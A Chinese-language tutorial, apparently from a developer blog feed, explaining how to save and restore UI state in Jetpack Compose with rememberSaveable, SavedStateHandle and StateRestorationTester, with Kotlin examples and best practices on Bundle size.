data-id="heading-0">保存界面状态</h3>
<p>在 Jetpack Compose 应用中，正确保存和恢复界面状态对于提供良好的用户体验至关重要。当应用因重新创建 activity 或进程而丢失界面状态时，用户可能会遇到数据丢失或界面不一致的问题。本指南将详细介绍如何在 Jetpack Compose 中保存和恢复界面状态。</p>
<hr/>
<h3 data-id="heading-1"><strong>1. 界面状态丢失的原因</strong></h3>
<p>Android 应用可能会因以下事件而丢失界面状态：</p>
<ul>
<li><strong>系统发起的进程终止</strong>：如内存不足时系统杀掉进程。</li>
<li><strong>配置更改</strong>：如屏幕旋转、语言切换等。</li>
<li><strong>用户发起的进程终止</strong>：如用户显式关闭应用。</li>
</ul>
<p>对于用户发起的进程终止，瞬时状态的丢失通常是合理的。但在其他情况下，保留状态对于提供流畅的用户体验至关重要。</p>
<hr/>
<h3 data-id="heading-2"><strong>2. 保存界面状态的策略</strong></h3>
<p>根据状态提升的位置和所需的逻辑，可以使用不同的 API 来保存和恢复界面状态。</p>
<h4 data-id="heading-3"><strong>2.1 界面逻辑中的状态保存</strong></h4>
<p>当状态在界面逻辑中提升时（无论是在可组合函数还是作用域限定为组合的普通状态容器类中），可以使用 <code>rememberSaveable</code> 在重新创建 activity 和进程之后保留状态。</p>
<p><strong>示例</strong>：保存单个布尔值界面元素状态</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ChatBubble</span><span class="hljs-params">(message: <span class="hljs-type">Message</span>)</span></span> {
    <span class="hljs-keyword">var</span> showDetails <span class="hljs-keyword">by</span> rememberSaveable { mutableStateOf(<span class="hljs-literal">false</span>) }
    ClickableText(
        text = AnnotatedString(message.content),
        onClick = { showDetails = !showDetails }
    )
    <span class="hljs-keyword">if</span> (showDetails) {
        Text(message.timestamp)
    }
}
</code></pre>
<p><strong>存储机制</strong>：</p>
<ul>
<li><code>rememberSaveable</code> 通过保存的实例状态机制将界面元素状态存储在 Bundle 中。</li>
<li>它能够自动将基元类型存储到 Bundle 中。对于非基元类型（如数据类），可以使用 <code>Parcelize</code> 注解、<code>listSaver</code> 和 <code>mapSaver</code> 等 Compose API，或实现自定义的 <code>Saver</code> 类。</li>
</ul>
<p><strong>示例</strong>：保存 <code>LazyListState</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">rememberLazyListState</span><span class="hljs-params">(
    initialFirstVisibleItemIndex: <span class="hljs-type">Int</span> = <span class="hljs-number">0</span>,
    initialFirstVisibleItemScrollOffset: <span class="hljs-type">Int</span> = <span class="hljs-number">0</span>
)</span></span>: LazyListState {
    <span class="hljs-keyword">return</span> rememberSaveable(saver = LazyListState.Saver) {
        LazyListState(initialFirstVisibleItemIndex, initialFirstVisibleItemScrollOffset)
    }
}
</code></pre>
<h4 data-id="heading-4"><strong>2.2 业务逻辑中的状态保存</strong></h4>
<p>当界面元素状态因业务逻辑需要被提升到 ViewModel 时，可以使用 ViewModel 的 API 来保存状态。</p>
<p><strong>ViewModel 的优势</strong>：</p>
<ul>
<li>ViewModel 实例在配置更改（如屏幕旋转）后仍然存在，因此提升到 ViewModel 的界面状态会保留在内存中。</li>
<li>但 ViewModel 实例在系统发起的进程终止后将失效。为了持久化状态，可以使用 <code>SavedStateHandle</code>。</li>
</ul>
<p><strong>示例</strong>：使用 <code>SavedStateHandle</code> 保存界面元素状态</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConversationViewModel</span>(savedStateHandle: SavedStateHandle) : ViewModel() {
    <span class="hljs-keyword">var</span> message <span class="hljs-keyword">by</span> savedStateHandle.saveable(stateSaver = TextFieldValue.Saver) {
        mutableStateOf(TextFieldValue(<span class="hljs-string">""</span>))
    }
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">set</span>

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">update</span><span class="hljs-params">(newMessage: <span class="hljs-type">TextFieldValue</span>)</span></span> {
        message = newMessage
    }
}

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">UserInput</span><span class="hljs-params">(viewModel: <span class="hljs-type">ConversationViewModel</span> = viewModel()</span></span>) {
    TextField(
        value = viewModel.message,
        onValueChange = { viewModel.update(it) }
    )
}
</code></pre>
<p><strong><code>SavedStateHandle</code> 的 API</strong>：</p>
<ul>
<li><strong><code>saveable</code> API</strong>：以 <code>MutableState</code> 形式读取和写入界面元素状态，支持基元类型和自定义 <code>Saver</code>。</li>
<li><strong><code>getStateFlow</code> API</strong>：存储界面元素状态，并将其用作来自 <code>SavedStateHandle</code> 的数据流。</li>
</ul>
<hr/>
<h3 data-id="heading-5"><strong>3. 最佳实践</strong></h3>
<h4 data-id="heading-6"><strong>3.1 界面逻辑中的最佳实践</strong></h4>
<ul>
<li><strong>避免存储大型对象</strong>：<code>rememberSaveable</code> 使用 Bundle 存储界面状态，Bundle 大小有限。存储大型复杂对象或对象列表可能会导致 <code>TransactionTooLargeException</code>。</li>
<li><strong>存储最少必需状态</strong>：仅存储恢复界面状态所需的最少数据（如 ID 或键），并使用这些数据从数据层重新生成复杂状态。</li>
</ul>
<h4 data-id="heading-7"><strong>3.2 业务逻辑中的最佳实践</strong></h4>
<ul>
<li><strong>使用 <code>SavedStateHandle</code> 存储简单状态</strong>：<code>SavedStateHandle</code> 也使用 Bundle 机制，因此应仅用于存储简单的界面元素状态。</li>
<li><strong>复杂状态使用永久性存储</strong>：屏幕界面状态可能非常复杂且庞大，不应存储在 <code>SavedStateHandle</code> 中。可以使用本地永久性存储（如 Room 数据库）来存储复杂数据。</li>
</ul>
<hr/>
<h3 data-id="heading-8"><strong>4. 验证状态恢复</strong></h3>
<p>为了验证重新创建 activity 或进程后，Compose 元素中使用 <code>rememberSaveable</code> 存储的状态是否已正确恢复，可以使用 <code>StateRestorationTester</code>。</p>
<p><strong>示例</strong>：使用 <code>StateRestorationTester</code> 验证状态恢复</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testStateRestoration</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> tester = StateRestorationTester(context)
    tester.setContent {
        <span class="hljs-keyword">val</span> (value, setValue) = rememberSaveable { mutableStateOf(<span class="hljs-number">0</span>) }
        <span class="hljs-comment">// Test logic here</span>
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-9"><strong>5. 总结</strong></h3>
<ul>
<li><strong>界面逻辑中的状态</strong>：使用 <code>rememberSaveable</code> 在重新创建 activity 和进程后保留状态。</li>
<li><strong>业务逻辑中的状态</strong>：如果状态被提升到 ViewModel，使用 <code>SavedStateHandle</code> 保存状态。</li>
<li><strong>最佳实践</strong>：避免在 Bundle 中存储大型复杂对象，存储最少必需状态，并使用永久性存储处理复杂数据。</li>
</ul>
<p>通过合理使用这些 API 和最佳实践，可以确保 Jetpack Compose 应用在面对配置更改和进程终止时保持一致的用户体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>